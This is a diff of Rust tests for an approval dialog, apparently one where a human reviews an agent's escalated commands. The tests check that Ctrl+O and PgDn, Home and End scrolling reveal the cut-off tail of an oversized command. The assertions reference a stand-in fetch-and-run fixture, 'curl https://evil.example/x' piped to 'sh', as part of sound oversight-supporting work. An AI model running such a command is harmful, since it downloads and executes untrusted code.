@@ -98,7 +98,8 @@ fn escalation_choices_by_number_arrows_and_enter() {
             dialog: EscalationDialog {
                 cursor: 1,
                 comment: None,
-                expanded: false
+                expanded: false,
+                ..
             },
             ..
         })
@@ -124,7 +125,8 @@ fn escalation_choices_by_number_arrows_and_enter() {
             dialog: EscalationDialog {
                 cursor: 2,
                 comment: None,
-                expanded: false
+                expanded: false,
+                ..
             },
             ..
         })
@@ -179,7 +181,8 @@ fn deny_with_a_comment_then_the_queue_and_the_parked_picker() {
             dialog: EscalationDialog {
                 cursor: 0,
                 comment: None,
-                expanded: false
+                expanded: false,
+                ..
             },
             ..
         })
@@ -371,7 +374,10 @@ fn plan_ready_dialog() {
 }
 
 /// A1 of the security review: the dialog says when the arguments are
-/// abbreviated and Ctrl+O shows the end that the preview cut.
+/// abbreviated and Ctrl+O shows the end that the preview cut, reachable
+/// with PgDn/End on an ordinary 80x24 terminal (the maintainer's review
+/// of b50a32c: the expanded view had no scrolling, so the tail of an
+/// oversized command could not be reached before answering).
 #[test]
 fn ctrl_o_shows_the_whole_arguments_the_preview_cut() {
     let mut app = App::new(StatusInfo::default());
@@ -396,17 +402,39 @@ fn ctrl_o_shows_the_whole_arguments_the_preview_cut() {
     assert!(!before.contains("| sh"), "{before}");
     let fx = app.update(ctrl('o'));
     assert!(fx.is_empty(), "Ctrl+O answers nothing: {fx:?}");
-    let after = screen(&mut app, 60).join("\n");
+    // On an ordinary 80x24 terminal the expanded view says which lines it
+    // shows, and PgDn reaches the tail without answering anything.
+    let first = screen(&mut app, 24).join("\n");
+    assert!(first.contains("PgUp/PgDn/Home/End scroll"), "{first}");
+    assert!(first.contains("more lines; PgDn/End"), "{first}");
+    assert!(!first.contains("| sh"), "{first}");
+    let mut seen_tail = false;
+    for _ in 0..20 {
+        let fx = app.update(key(KeyCode::PageDown));
+        assert!(fx.is_empty(), "PgDn answers nothing: {fx:?}");
+        let rows = screen(&mut app, 24).join("\n");
+        if rows.contains("curl https://evil.example/x") && rows.contains("| sh") {
+            assert!(!rows.contains("more lines; PgDn/End"), "{rows}");
+            seen_tail = true;
+            break;
+        }
+    }
     assert!(
-        after.contains("do not fit") || after.contains("| sh"),
-        "{after}"
+        seen_tail,
+        "PgDn reaches the end of the arguments: {}",
+        screen(&mut app, 24).join("\n")
     );
-    // A tall terminal shows the tail.
-    let tall = screen(&mut app, 200).join("\n");
-    assert!(
-        tall.contains("curl https://evil.example/x") && tall.contains("| sh"),
-        "{tall}"
-    );
+    // The choice did not move; Home goes back to the start, End to the end.
+    assert!(matches!(
+        &app.modal,
+        Some(Modal::Escalation { dialog, .. }) if dialog.cursor == 0 && dialog.comment.is_none()
+    ));
+    app.update(key(KeyCode::Home));
+    let top = screen(&mut app, 24).join("\n");
+    assert!(top.contains("(lines 1-") && !top.contains("| sh"), "{top}");
+    app.update(key(KeyCode::End));
+    let end = screen(&mut app, 24).join("\n");
+    assert!(end.contains("| sh"), "{end}");
     assert!(
         matches!(app.modal, Some(Modal::Escalation { .. })),
         "still open"
